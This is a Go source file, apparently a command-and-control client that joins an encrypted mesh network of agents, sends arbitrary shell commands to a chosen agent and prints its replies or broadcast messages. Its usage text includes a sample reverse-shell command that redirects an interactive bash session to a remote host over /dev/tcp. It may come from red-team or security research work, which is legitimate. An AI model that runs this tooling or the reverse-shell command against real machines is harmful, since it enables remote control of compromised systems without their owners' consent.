package main

/*
 * commander.go
 * Sends a command to an ezmagent
 * By J. Stuart McMurray
 * Created 20170414
 * Last Modified 20170414
 */

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"time"

	"github.com/magisterquis/ezmesh"
)

var bc = make(chan string)

func main() {
	var (
		target = flag.String(
			"t",
			"localhost:3000",
			"Mesh node `target`",
		)
		key = flag.String(
			"k",
			"kittens",
			"Encryption `key`",
		)
		nick = flag.String(
			"n",
			"C2",
			"Human-friendly `nickname`",
		)
		watchB = flag.Bool(
			"b",
			false,
			"Don't send a command, just print broadcast messages",
		)
		waitTime = flag.Duration(
			"w",
			2*time.Minute,
			"Total `time` to wait before exiting if sending a "+
				"command",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v -b [options]
Usage: %v [options] target "command"

With -b, monitors mesh network for broadcast messages.  Without -b, sends the
command to the target, and waits for a reply.  The command should be surrounded
by quotes.

Command example:

%v 00:11:22:33:44:55 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 & echo shell'

Options:
`,
			os.Args[0],
			os.Args[0],
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Get the connection target */
	ip, err := net.ResolveTCPAddr("tcp", *target)
	if nil != err {
		log.Fatalf("Unable to resolve %q: %v", *target, err)
	}

	/* Make a config */
	conf := ezmesh.Config{
		Key:          []byte(*key),
		NickName:     *nick,
		InitialPeers: []*net.TCPAddr{ip},
		AutoConnect:  true,
	}
	/* Decide whether to watch for broadcast or print unicast messages */
	var pn ezmesh.PeerName /* Command target */
	if *watchB {
		conf.OnBroadcast = onBroadcast
	} else {
		if 2 != flag.NArg() {
			fmt.Fprintf(
				os.Stderr,
				"Please supply a target and command "+
					"(in quotes)",
			)
			flag.Usage()
			os.Exit(2)
		}
		/* Send command to target */
		pn, err = ezmesh.UnStringPeerName(flag.Arg(0))
		if nil != err {
			log.Fatalf("Bad target name %q: %v", flag.Arg(0), err)
		}
		conf.OnMessage = onMessage
	}

	/* Join the network */
	p, errs, err := ezmesh.New(
		conf,
		log.New(
			//os.Stderr,
			ioutil.Discard,
			fmt.Sprintf("[%v] ", *nick),
			log.LstdFlags,
		),
	)
	if nil != err {
		log.Fatalf("Unable to join mesh network: %v", err)
	}
	if nil != errs && 0 != len(errs) {
		log.Fatalf("Unable to connect to %v: %v", ip, err)
	}
	log.Printf("Joined the network")

	/* Watch broadcast messages forever if -b */
	if *watchB {
		log.Printf("Waiting on broadcasts")
		log.SetOutput(os.Stdout)
		for l := range bc {
			log.Printf("%v", l)
		}
	}

	/* Timeout timer */
	go func() {
		log.Printf("Staring %v timeout timer", *waitTime)
		<-time.After(*waitTime)
		log.Fatalf("No response received from %v in time", pn)
	}()

	/* Wait to find the peer */
	var nn string
	var ok bool
	log.Printf("Waiting to find %v", pn)
	for {
		nn, ok = p.NickNameFromPeerName(pn)
		if ok {
			break
		}
		time.Sleep(time.Second)
	}
	log.Printf("Found %v (%v)", pn, nn)

	/* Send target to peer */
	if err := p.Send(pn, []byte(flag.Arg(1))); nil != err {
		log.Fatalf("Unable to send command to %v: %v", pn, err)
	}
	log.Printf("Sent command to %v", pn)

	/* Wait for response */
	log.Printf("%v", <-bc)   /* Header */
	fmt.Printf("%v\n", <-bc) /* Payload */

}

/* onBroadcast prints a broadcast message along with its sender */
func onBroadcast(p *ezmesh.Peer, src ezmesh.PeerName, msg []byte) error {
	bc <- fmt.Sprintf(
		"%v (%v) %v",
		src,
		getNickName(p, src),
		string(msg),
	)
	return nil
}

/* onMessage prints a message from a target */
func onMessage(p *ezmesh.Peer, src ezmesh.PeerName, msg []byte) error {
	bc <- fmt.Sprintf(
		"Reply from %v (%v)",
		src,
		getNickName(p, src),
	)
	bc <- string(msg)
	return nil
}

/* getNickName tries to get the peer's nickname, and failing that returns a
question mark. */
func getNickName(p *ezmesh.Peer, pn ezmesh.PeerName) string {
	nn, ok := p.NickNameFromPeerName(pn)
	if !ok {
		return "?"
	}
	return nn
}
